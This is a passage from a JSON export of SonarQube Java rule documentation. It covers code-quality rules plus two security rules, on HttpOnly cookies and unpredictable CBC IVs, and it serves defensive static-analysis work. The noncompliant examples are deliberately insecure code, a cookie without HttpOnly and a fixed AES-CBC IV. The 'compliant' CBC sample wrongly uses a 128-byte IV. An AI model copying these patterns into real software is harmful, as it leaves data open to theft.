correctly","tags":["cert","confusing"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"LOGICAL","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Minor","description":"<h2>Why is this an issue?</h2>\n<p>According to the documentation,</p>\n<blockquote>\n  <p>A program may produce unpredictable results if it attempts to distinguish two references to equal values of a value-based class, whether directly\n  via reference equality or indirectly via an appeal to synchronization, identity hashing, serializationâ¦â</p>\n</blockquote>\n<p>For example (credit to Brian Goetz), imagine Foo is a value-based class:</p>\n<pre>\nFoo[] arr = new Foo[2];\narr[0] = new Foo(0);\narr[1] = new Foo(0);\n</pre>\n<p>Serialization promises that on deserialization of arr, elements 0 and 1 will not be aliased. Similarly, in:</p>\n<pre>\nFoo[] arr = new Foo[2];\narr[0] = new Foo(0);\narr[1] = arr[0];\n</pre>\n<p>Serialization promises that on deserialization of <code>arr</code>, elements 0 and 1 <strong>will</strong> be aliased.</p>\n<p>While these promises are coincidentally fulfilled in current implementations of Java, that is not guaranteed in the future, particularly when true\nvalue types are introduced in the language.</p>\n<p>This rule raises an issue when a <code>Serializable</code> class defines a non-transient, non-static field field whose type is a known serializable\nvalue-based class. Known serializable value-based classes are: all the classes in the <code>java.time</code> package except <code>Clock</code>; the\ndate classes for alternate calendars: <code>HijrahDate</code>, <code>JapaneseDate</code>, <code>MinguoDate</code>, <code>ThaiBuddhistDate</code>.</p>\n<h3>Noncompliant code example</h3>\n<pre>\nclass MyClass implements Serializable {\n  private HijrahDate date;  // Noncompliant; mark this transient\n  // ...\n}\n</pre>\n<h3>Compliant solution</h3>\n<pre>\nclass MyClass implements Serializable {\n  private transient HijrahDate date;\n  // ...\n}\n</pre>\n<h2>Resources</h2>\n<ul>\n  <li> <a href=\"https://docs.oracle.com/javase/8/docs/api/java/lang/doc-files/ValueBased.html\">Value-based classes</a> </li>\n</ul>\n\n","impacts":[{"name":"maintainability","level":"LOW"}],"inDefaultProfile":false,"quickfix":"unknown","ruleKey":"RSPEC-3437","summary":"Value-based objects should not be serialized","tags":["serialization","java8","lock-in"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"LOGICAL","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Major","description":"<h2>Why is this an issue?</h2>\n<p>According to the documentation,</p>\n<blockquote>\n  <p>A program may produce unpredictable results if it attempts to distinguish two references to equal values of a value-based class, whether directly\n  via reference equality or indirectly via an appeal to synchronizationâ¦â</p>\n</blockquote>\n<p>This is because value-based classes are intended to be wrappers for value types, which will be primitive-like collections of data (similar to\n<code>struct</code>s in other languages) that will come in future versions of Java.</p>\n<blockquote>\n  <p>Instances of a value-based class â¦â</p>\n  <ul>\n    <li> do not have accessible constructors, but are instead instantiated through factory methods which make no commitment as to the identity of\n    returned instances; </li>\n  </ul>\n</blockquote>\n<p>This means that you canât be sure youâre the only one trying to lock on any given instance of a value-based class, opening your code up to\ncontention and deadlock issues.</p>\n<p>Under Java 8 breaking this rule may not actually break your code, but there are no guarantees of the behavior beyond that.</p>\n<p>This rule raises an issue when a known value-based class is used for synchronization. That includes all the classes in the <code>java.time</code>\npackage except <code>Clock</code>; the date classes for alternate calendars, <code>HijrahDate</code>, <code>JapaneseDate</code>,\n<code>MinguoDate</code>, <code>ThaiBuddhistDate</code>; and the optional classes: <code>Optional</code>, <code>OptionalDouble</code>,\n<code>OptionalLong</code>, <code>OptionalInt</code>.</p>\n<p><strong>Note</strong> that this rule is automatically disabled when the projectâs <code>sonar.java.source</code> is lower than <code>8</code>.</p>\n<h3>Noncompliant code example</h3>\n<pre>\nOptional&lt;Foo&gt; fOpt = doSomething();\nsynchronized (fOpt) {  // Noncompliant\n  // ...\n}\n</pre>\n<h2>Resources</h2>\n<ul>\n  <li> <a href=\"https://docs.oracle.com/javase/8/docs/api/java/lang/doc-files/ValueBased.html\">Value-based classes</a> </li>\n</ul>\n\n","impacts":[{"name":"reliability","level":"MEDIUM"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-3436","summary":"Value-based classes should not be used for locking","tags":["multi-threading","java8","lock-in"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"LOGICAL","type":"Bug"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Minor","description":"<h2>Why is this an issue?</h2>\n<p>It is convention to name each classâs logger for the class itself. Doing so allows you to set up clear, communicative logger configuration. Naming\nloggers by some other convention confuses configuration, and using the same class name for multiple class loggers prevents the granular configuration\nof each class' logger. Some libraries, such as SLF4J warn about this, but not all do.</p>\n<p>This rule raises an issue when a logger is not named for its enclosing class.</p>\n<h3>Noncompliant code example</h3>\n<pre>\npublic class MyClass {\n  private final static Logger LOG = LoggerFactory.getLogger(WrongClass.class);  // Noncompliant; multiple classes using same logger\n}\n</pre>\n<h3>Compliant solution</h3>\n<pre>\npublic class MyClass {\n  private final static Logger LOG = LoggerFactory.getLogger(MyClass.class);\n}\n</pre>\n\n","impacts":[{"name":"maintainability","level":"LOW"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-3416","summary":"Loggers should be named for their enclosing classes","tags":["confusing","logging"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"IDENTIFIABLE","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Major","description":"<h2>Why is this an issue?</h2>\n<p>The standard assertions library methods such as <code>org.junit.Assert.assertEquals</code>, and <code>org.junit.Assert.assertSame</code> expect the\nfirst argument to be the expected value and the second argument to be the actual value. For AssertJ instead, the argument of\n<code>org.assertj.core.api.Assertions.assertThat</code> is the actual value, and the subsequent calls contain the expected values.</p>\n<h3>What is the potential impact?</h3>\n<p>Having the expected value and the actual value in the wrong order will not alter the outcome of tests, (succeed/fail when it should) but the error\nmessages will contain misleading information.</p>\n<p>This rule raises an issue when the actual argument to an assertions library method is a hard-coded value and the expected argument is not.</p>\n<h2>How to fix it</h2>\n<p>You should provide the assertion methods with a hard-coded value as the expected value, while the actual value of the assertion should derive from\nthe portion of code that you want to test.</p>\n<p>Supported frameworks:</p>\n<ul>\n  <li> <a href=\"https://junit.org/junit4/\">JUnit4</a> </li>\n  <li> <a href=\"https://junit.org/junit5/docs/current/user-guide/\">JUnit5</a> </li>\n  <li> <a href=\"https://assertj.github.io/doc/\">AssertJ</a> </li>\n</ul>\n<h3>Code examples</h3>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\norg.junit.Assert.assertEquals(runner.exitCode(), 0, \"Unexpected exit code\");  // Noncompliant; Yields error message like: Expected:&lt;-1&gt;. Actual:&lt;0&gt;.\norg.assertj.core.api.Assertions.assertThat(0).isEqualTo(runner.exitCode()); // Noncompliant\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\norg.junit.Assert.assertEquals(0, runner.exitCode(), \"Unexpected exit code\");\norg.assertj.core.api.Assertions.assertThat(runner.exitCode()).isEqualTo(0);\n</pre>\n\n","impacts":[{"name":"maintainability","level":"MEDIUM"}],"inDefaultProfile":true,"quickfix":"partial","ruleKey":"RSPEC-3415","summary":"Assertion arguments should be passed in the correct order","tags":["junit","tests","suspicious"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"LOGICAL","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Major","description":"<h2>Why is this an issue?</h2>\n<p>It is a good practice to isolate test classes in a separate package so that what is shipped to production is neither polluted by nor bloated with\nthem. Further, including unit tests in code assemblies could affect build processes.</p>\n<p>This rule raises an issue when test classes are found in projects containing non-test-related code.</p>\n\n","impacts":[{"name":"maintainability","level":"MEDIUM"}],"inDefaultProfile":false,"quickfix":"unknown","ruleKey":"RSPEC-3414","summary":"Tests should be kept in a dedicated source directory","tags":["tests","suspicious"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"MODULAR","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Minor","description":"<h2>Why is this an issue?</h2>\n<p>Thereâs no point in forcing the overhead of a method call for a method that always returns the same constant value. Even worse, the fact that a\nmethod call must be made will likely mislead developers who call the method thinking that something more is done. Declare a constant instead.</p>\n<p>This rule raises an issue if on methods that contain only one statement: the <code>return</code> of a constant value.</p>\n<h3>Noncompliant code example</h3>\n<pre>\nint getBestNumber() {\n  return 12;  // Noncompliant\n}\n</pre>\n<h3>Compliant solution</h3>\n<pre>\nstatic final int BEST_NUMBER = 12;\n</pre>\n<h3>Exceptions</h3>\n<p>The following types of method are ignored:</p>\n<ul>\n  <li> methods that override a method. </li>\n  <li> methods that are not final (not having the <code>final</code>, <code>private</code> or <code>static</code> modifier and not in a record or a\n  final class). </li>\n  <li> methods with annotations, such as <code>@Override</code> or Springâs <code>@RequestMapping</code>. </li>\n</ul>\n\n","impacts":[{"name":"maintainability","level":"LOW"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-3400","summary":"Methods should not return constants","tags":["confusing"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"CLEAR","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Minor","description":"<h2>Why is this an issue?</h2>\n<p>When a <code>private</code> method is only invoked by an inner class, thereâs no reason not to move it into that class. It will still have the same\naccess to the outer class' members, but the outer class will be clearer and less cluttered.</p>\n<h3>Noncompliant code example</h3>\n<pre>\npublic class Outie {\n  private int i=0;\n\n  private void increment() {  // Noncompliant\n    i++;\n  }\n\n  public class Innie {\n    public void doTheThing() {\n      Outie.this.increment();\n    }\n  }\n}\n</pre>\n<h3>Compliant solution</h3>\n<pre>\npublic class Outie {\n  private int i=0;\n\n  public class Innie {\n    public void doTheThing() {\n      increment();\n    }\n\n    private void increment() {\n      Outie.this.i++;\n    }\n  }\n}\n</pre>\n\n","impacts":[{"name":"maintainability","level":"LOW"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-3398","summary":"\"private\" methods called only by inner classes should be moved to those classes","tags":["confusing"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"CLEAR","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Major","description":"<h2>Why is this an issue?</h2>\n<p>In single-threaded environments, the use of <code>this</code> in constructors is normal, and expected. But in multi-threaded environments, it could\nexpose partially-constructed objects to other threads, and should be used with caution.</p>\n<p>The classic example is a class with a <code>static</code> list of its instances. If the constructor stores <code>this</code> in the list, another\nthread could access the object before itâs fully-formed. Even when the storage of <code>this</code> is the last instruction in the constructor,\nthereâs still a danger if the class is not <code>final</code>. In that case, the initialization of subclasses wonât be complete before\n<code>this</code> is exposed.</p>\n<p>This rule raises an issue when <code>this</code> is assigned to any globally-visible object in a constructor, and when it is passed to the method\nof another object in a constructor</p>\n<h3>Noncompliant code example</h3>\n<pre>\npublic class Monument {\n\n  public static final List&lt;Monument&gt; ALL_MONUMENTS = new ArrayList()&lt;&gt;;\n  // ...\n\n  public Monument(String location, ...) {\n    ALL_MONUMENTS.add(this);  // Noncompliant; passed to a method of another object\n\n    this.location = location;\n    // ...\n  }\n}\n</pre>\n<h3>Exceptions</h3>\n<p>This rule ignores instances of assigning <code>this</code> directly to a <code>static</code> field of the same class because that case is covered\nby {rule:java:S3010} .</p>\n<h2>Resources</h2>\n<ul>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/x/iDdGBQ\">CERT, TSM01-J.</a> - Do not let the this reference escape during object construction\n  </li>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/x/vzdGBQ\">CERT, TSM03-J.</a> - Do not publish partially initialized objects </li>\n</ul>\n\n","impacts":[{"name":"maintainability","level":"MEDIUM"}],"inDefaultProfile":false,"quickfix":"unknown","ruleKey":"RSPEC-3366","summary":"\"this\" should not be exposed from constructors","tags":["multi-threading","cert","suspicious"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"LOGICAL","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Major","description":"<h2>Why is this an issue?</h2>\n<p>Nested ternaries are hard to read and can make the order of operations complex to understand.</p>\n<pre>\npublic String getReadableStatus(Job j) {\n  return j.isRunning() ? \"Running\" : j.hasErrors() ? \"Failed\" : \"Succeeded\";  // Noncompliant\n}\n</pre>\n<p>Instead, use another line to express the nested operation in a separate statement.</p>\n<pre>\npublic String getReadableStatus(Job j) {\n  if (j.isRunning()) {\n    return \"Running\";\n  }\n  return j.hasErrors() ? \"Failed\" : \"Succeeded\";\n}\n</pre>\n\n","impacts":[{"name":"maintainability","level":"MEDIUM"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-3358","summary":"Ternary operators should not be nested","tags":["confusing"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"CLEAR","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Major","description":"<h2>Why is this an issue?</h2>\n<p>Since <code>assert</code> statements arenât executed by default (they must be enabled with JVM flags) developers should never rely on their\nexecution the evaluation of any logic required for correct program function.</p>\n<h3>Noncompliant code example</h3>\n<pre>\nassert myList.remove(myList.get(0));  // Noncompliant\n</pre>\n<h3>Compliant solution</h3>\n<pre>\nboolean removed = myList.remove(myList.get(0));\nassert removed;\n</pre>\n<h2>Resources</h2>\n<ul>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/x/mjdGBQ\">CERT, EXP06-J.</a> - Expressions used in assertions must not produce side effects </li>\n</ul>\n\n","impacts":[{"name":"reliability","level":"MEDIUM"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-3346","summary":"Expressions used in \"assert\" should not produce side effects","tags":["cert"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"CLEAR","type":"Bug"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Minor","description":"<p>When a cookie is configured with the <code>HttpOnly</code> attribute set to <em>true</em>, the browser guaranties that no client-side script will\nbe able to read it. In most cases, when a cookie is created, the default value of <code>HttpOnly</code> is <em>false</em> and itâs up to the developer\nto decide whether or not the content of the cookie can be read by the client-side script. As a majority of Cross-Site Scripting (XSS) attacks target\nthe theft of session-cookies, the <code>HttpOnly</code> attribute can help to reduce their impact as it wonât be possible to exploit the XSS\nvulnerability to steal session-cookies.</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> the cookie is sensitive, used to authenticate the user, for instance a <em>session-cookie</em> </li>\n  <li> the <code>HttpOnly</code> attribute offer an additional protection (not the case for an <em>XSRF-TOKEN cookie</em> / CSRF token for example)\n  </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<ul>\n  <li> By default the <code>HttpOnly</code> flag should be set to <em>true</em> for most of the cookies and itâs mandatory for session /\n  sensitive-security cookies. </li>\n</ul>\n<h2>Sensitive Code Example</h2>\n<p>If you create a security-sensitive cookie in your JAVA code:</p>\n<pre>\nCookie c = new Cookie(COOKIENAME, sensitivedata);\nc.setHttpOnly(false);  // Sensitive: this sensitive cookie is created with the httponly flag set to false and so it can be stolen easily in case of XSS vulnerability\n</pre>\n<p>By default the <a href=\"https://docs.oracle.com/javaee/6/api/javax/servlet/http/Cookie.html#setHttpOnly(boolean)\"><code>HttpOnly</code></a> flag is\nset to <em>false:</em></p>\n<pre>\nCookie c = new Cookie(COOKIENAME, sensitivedata);  // Sensitive: this sensitive cookie is created with the httponly flag not defined (by default set to false) and so it can be stolen easily in case of XSS vulnerability\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nCookie c = new Cookie(COOKIENAME, sensitivedata);\nc.setHttpOnly(true); // Compliant: this sensitive cookie is protected against theft (HttpOnly=true)\n</pre>\n<h2>See</h2>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A05_2021-Security_Misconfiguration/\">Top 10 2021 Category A5 - Security Misconfiguration</a> </li>\n  <li> <a href=\"https://owasp.org/www-community/HttpOnly\">OWASP HttpOnly</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A7_2017-Cross-Site_Scripting_(XSS)\">Top 10 2017 Category A7 - Cross-Site Scripting\n  (XSS)</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/1004\">CWE-1004 - Sensitive Cookie Without 'HttpOnly' Flag</a> </li>\n  <li> Derived from FindSecBugs rule <a href=\"https://find-sec-bugs.github.io/bugs.htm#HTTPONLY_COOKIE\">HTTPONLY_COOKIE</a> </li>\n  <li> STIG Viewer - <a href=\"https://stigviewer.com/stigs/application_security_and_development/2024-12-06/finding/V-222575\">Application Security and\n  Development: V-222575</a> - The application must set the HTTPOnly flag on session cookies. </li>\n</ul>\n\n","impacts":[{"name":"security","level":"LOW"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-3330","summary":"Creating cookies without the \"HttpOnly\" flag is security-sensitive","tags":["cwe","privacy"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"COMPLETE","type":"Security Hotspot"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Critical","description":"<p>This vulnerability exposes encrypted data to a number of attacks whose goal is to recover the plaintext.</p>\n<h2>Why is this an issue?</h2>\n<p>Encryption algorithms are essential for protecting sensitive information and ensuring secure communications in a variety of domains. They are used\nfor several important reasons:</p>\n<ul>\n  <li> Confidentiality, privacy, and intellectual property protection </li>\n  <li> Security during transmission or on storage devices </li>\n  <li> Data integrity, general trust, and authentication </li>\n</ul>\n<p>When selecting encryption algorithms, tools, or combinations, you should also consider two things:</p>\n<ol>\n  <li> No encryption is unbreakable. </li>\n  <li> The strength of an encryption algorithm is usually measured by the effort required to crack it within a reasonable time frame. </li>\n</ol>\n<p>In the mode Cipher Block Chaining (CBC), each block is used as cryptographic input for the next block. For this reason, the first block requires an\ninitialization vector (IV), also called a \"starting variable\" (SV).</p>\n<p>If the same IV is used for multiple encryption sessions or messages, each new encryption of the same plaintext input would always produce the same\nciphertext output. This may allow an attacker to detect patterns in the ciphertext.</p>\n<h3>What is the potential impact?</h3>\n<p>After retrieving encrypted data and performing cryptographic attacks on it on a given timeframe, attackers can recover the plaintext that\nencryption was supposed to protect.</p>\n<p>Depending on the recovered data, the impact may vary.</p>\n<p>Below are some real-world scenarios that illustrate the potential impact of an attacker exploiting the vulnerability.</p>\n<h4>Additional attack surface</h4>\n<p>By modifying the plaintext of the encrypted message, an attacker may be able to trigger additional vulnerabilities in the code. An attacker can\nfurther exploit a system to obtain more information.<br> Encrypted values are often considered trustworthy because it would not be possible for a\nthird party to modify them under normal circumstances.</p>\n<h4>Breach of confidentiality and privacy</h4>\n<p>When encrypted data contains personal or sensitive information, its retrieval by an attacker can lead to privacy violations, identity theft,\nfinancial loss, reputational damage, or unauthorized access to confidential systems.</p>\n<p>In this scenario, a company, its employees, users, and partners could be seriously affected.</p>\n<p>The impact is twofold, as data breaches and exposure of encrypted data can undermine trust in the organization, as customers, clients and\nstakeholders may lose confidence in the organizationâs ability to protect their sensitive data.</p>\n<h4>Legal and compliance issues</h4>\n<p>In many industries and locations, there are legal and compliance requirements to protect sensitive data. If encrypted data is compromised and the\nplaintext can be recovered, companies face legal consequences, penalties, or violations of privacy laws.</p>\n<h2>How to fix it in Java Cryptography Extension</h2>\n<h3>Code examples</h3>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\nimport java.nio.charset.StandardCharsets;\nimport java.security.NoSuchAlgorithmException;\nimport java.security.InvalidKeyException;\nimport java.security.InvalidAlgorithmParameterException;\nimport javax.crypto.Cipher;\nimport javax.crypto.spec.IvParameterSpec;\nimport javax.crypto.spec.SecretKeySpec;\nimport javax.crypto.NoSuchPaddingException;\n\npublic void encrypt(String key, String plainText) {\n\n    byte[] RandomBytes = \"7cVgr5cbdCZVw5WY\".getBytes(StandardCharsets.UTF_8);\n\n    IvParameterSpec iv   = new IvParameterSpec(RandomBytes);\n    SecretKeySpec keySpec = new SecretKeySpec(key.getBytes(StandardCharsets.UTF_8), \"AES\");\n\n    try {\n        Cipher cipher = Cipher.getInstance(\"AES/CBC/PKCS5Padding\");\n        cipher.init(Cipher.ENCRYPT_MODE, keySpec, iv);\n\n    } catch(NoSuchAlgorithmException|InvalidKeyException|\n            NoSuchPaddingException|InvalidAlgorithmParameterException e) {\n        // ...\n    }\n}\n</pre>\n<h4>Compliant solution</h4>\n<p>In this example, the code explicitly uses a number generator that is considered <strong>strong</strong>.</p>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\nimport java.nio.charset.StandardCharsets;\nimport java.security.SecureRandom;\nimport java.security.NoSuchAlgorithmException;\nimport java.security.InvalidKeyException;\nimport java.security.InvalidAlgorithmParameterException;\nimport javax.crypto.Cipher;\nimport javax.crypto.spec.IvParameterSpec;\nimport javax.crypto.spec.SecretKeySpec;\nimport javax.crypto.NoSuchPaddingException;\n\npublic void encrypt(String key, String plainText) {\n\n    SecureRandom random = new SecureRandom();\n    byte[] randomBytes  = new byte[128];\n    random.nextBytes(randomBytes);\n\n    IvParameterSpec iv   = new IvParameterSpec(randomBytes);\n    SecretKeySpec keySpec = new SecretKeySpec(key.getBytes(StandardCharsets.UTF_8), \"AES\");\n\n    try {\n        Cipher cipher = Cipher.getInstance(\"AES/CBC/PKCS5Padding\");\n        cipher.init(Cipher.ENCRYPT_MODE, keySpec, iv);\n\n    } catch(NoSuchAlgorithmException|InvalidKeyException|\n            NoSuchPaddingException|InvalidAlgorithmParameterException e) {\n        // ...\n    }\n}\n</pre>\n<h3>How does this work?</h3>\n<h4>Use unique IVs</h4>\n<p>To ensure high security, initialization vectors must meet two important criteria:</p>\n<ul>\n  <li> IVs must be unique for each encryption operation. </li>\n  <li> For CBC and CFB modes, a secure FIPS-compliant random number generator should be used to generate unpredictable IVs. </li>\n</ul>\n<p>The IV does not need be secret, so the IV or information sufficient to determine the IV may be transmitted along with the ciphertext.</p>\n<p>In the previous non-compliant example, the problem is not that the IV is hard-coded.<br> It is that the same IV is used for multiple encryption\nattempts.</p>\n<h2>Resources</h2>\n<h3>Standards</h3>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A02_2021-Cryptographic_Failures/\">Top 10 2021 Category A2 - Cryptographic Failures</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure\">Top 10 2017 Category A3 - Sensitive Data\n  Exposure</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration\">Top 10 2017 Category A6 - Security\n  Misconfiguration</a> </li>\n  <li> OWASP - <a href=\"https://mas.owasp.org/checklists/MASVS-CRYPTO/\">Mobile AppSec Verification Standard - Cryptography Requirements</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-mobile-top-10/2016-risks/m5-insufficient-cryptography\">Mobile Top 10 2016 Category M5 -\n  Insufficient Cryptography</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-mobile-top-10/2023-risks/m10-insufficient-cryptography\">Mobile Top 10 2024 Category M10 -\n  Insufficient Cryptography</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/329\">CWE-329 - Not Using an Unpredictable IV with CBC Mode</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/780\">CWE-780 - Use of RSA Algorithm without OAEP</a> </li>\n  <li> <a href=\"https://nvlpubs.nist.gov/nistpubs/Legacy/SP/nistspecialpublication800-38a.pdf\">NIST, SP-800-38A</a> - Recommendation for Block Cipher\n  Modes of Operation </li>\n</ul>\n\n","impacts":[{"name":"security","level":"HIGH"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-3329","summary":"Cipher Block Chaining IVs should be unpredictable","tags":["cwe"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"TRUSTWORTHY","type":"Vulnerability"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Major","description":"<h2>Why is this an issue?</h2>\n<p>Field injection seems like a tidy way to get your classes what they need to do their jobs, but itâs really a <code>NullPointerException</code>\nwaiting to happen unless all your class constructors are <code>private</code>. Thatâs because any class instances that are constructed by callers,\nrather than instantiated by a Dependency Injection framework compliant with the JSR-330 (Spring, Guice, â¦â), wonât have the ability to perform the\nfield injection.</p>\n<p>Instead <code>@Inject</code> should be moved to the constructor and the fields required as constructor parameters.</p>\n<p>This rule raises an issue when classes with non-<code>private</code> constructors (including the default constructor) use field injection.</p>\n<h3>Noncompliant code example</h3>\n<pre>\nclass MyComponent {  // Anyone can call the default constructor\n\n  @Inject MyCollaborator collaborator;  // Noncompliant\n\n  public void myBusinessMethod() {\n    collaborator.doSomething();  // this will fail in classes new-ed by a caller\n  }\n}\n</pre>\n<h3>Compliant solution</h3>\n<pre>\nclass MyComponent {\n\n  private final MyCollaborator collaborator;\n\n  @Inject\n  public MyComponent(MyCollaborator collaborator) {\n    Assert.notNull(collaborator, \"MyCollaborator must not be null!\");\n    this.collaborator = collaborator;\n  }\n\n  public void myBusinessMethod() {\n    collaborator.doSomething();\n  }\n}\n</pre>\n\n","impacts":[{"name":"reliability","level":"MEDIUM"}],"inDefaultProfile":false,"quickfix":"unknown","ruleKey":"RSPEC-3306","summary":"Constructor injection should be used instead of field injection","tags":["spring","design","jee","pitfall"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"COMPLETE","type":"Bug"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Critical","description":"<h2>Why is this an issue?</h2>\n<p>When <code>@Autowired</code> is used, dependencies need to be resolved when the class is instantiated, which may cause early initialization of\nbeans or lead the context to look in places it shouldnât to find the bean. To avoid this tricky issue and optimize the way the context loads,\ndependencies should be requested as late as possible. That means using parameter injection instead of field injection for dependencies that are only\nused in a single <code>@Bean</code> method.</p>\n<h3>Noncompliant code example</h3>\n<pre>\n@Configuration\npublic class âFooConfiguration {\n\n  @Autowired private âDataSource dataSourceâÍ¾  // Noncompliant\n\n  @Bean\n  public âMyService myService() {\n    return new âMyService(thisâ.dataSourceâ)Í¾\n  }\n}\n</pre>\n<h3>Compliant solution</h3>\n<pre>\n@Configuration\npublic class âFooConfiguration {\n\n @Bean\n  public âMyService myService(DataSource dataSource) {\n    return new âMyService(dataSource)Í¾\n  }\n}\n</pre>\n<h3>Exceptions</h3>\n<p>Fields used in methods that are called directly by other methods in the application (as opposed to being invoked automatically by the Spring\nframework) are ignored by this rule so that direct callers donât have to provide the dependencies themselves.</p>\n\n","impacts":[{"name":"maintainability","level":"HIGH"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-3305","summary":"Factory method injection should be used in \"@Configuration\" classes","tags":["spring","performance"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"CLEAR","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Minor","description":"<h2>Why is this an issue?</h2>\n<p>Specifying the default value for an annotation parameter is redundant. Such values should be omitted in the interests of readability.</p>\n<h3>Noncompliant code example</h3>\n<pre>\n@MyAnnotation(arg = \"def\")  // Noncompliant\npublic class MyClass {\n  // ...\n}\npublic @interface MyAnnotation {\n  String arg() default \"def\";\n}\n</pre>\n<h3>Compliant solution</h3>\n<pre>\n@MyAnnotation\npublic class MyClass {\n  // ...\n}\npublic @interface MyAnnotation {\n  String arg() default \"def\";\n}\n</pre>\n\n","impacts":[{"name":"maintainability","level":"LOW"}],"inDefaultProfile":false,"quickfix":"unknown","ruleKey":"RSPEC-3254","summary":"Default annotation parameter values should not be passed as arguments","tags":["finding","clumsy"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"CLEAR","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Critical","description":"<h2>Why is this an issue?</h2>\n<p>In object-oriented programming, inappropriately accessing static members of a base class via derived types is considered a code smell.</p>\n<p>Static members are associated with the class itself, not with any specific instance of the class or its children classes. Accessing through the\nwrong type suggests a misunderstanding of the ownership and role of this member. This can make the maintenance of the code more complicated.</p>\n<p>Therefore, the access should be done directly through the base class to maintain clarity and avoid potential misunderstandings.</p>\n<h3>Noncompliant code example</h3>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\nclass Parent {\n  public static int counter;\n}\n\nclass Child extends Parent {\n  public Child() {\n    Child.counter++;  // Noncompliant\n  }\n}\n</pre>\n<h3>Compliant solution</h3>\n<pre data-diff-id=\"1\" 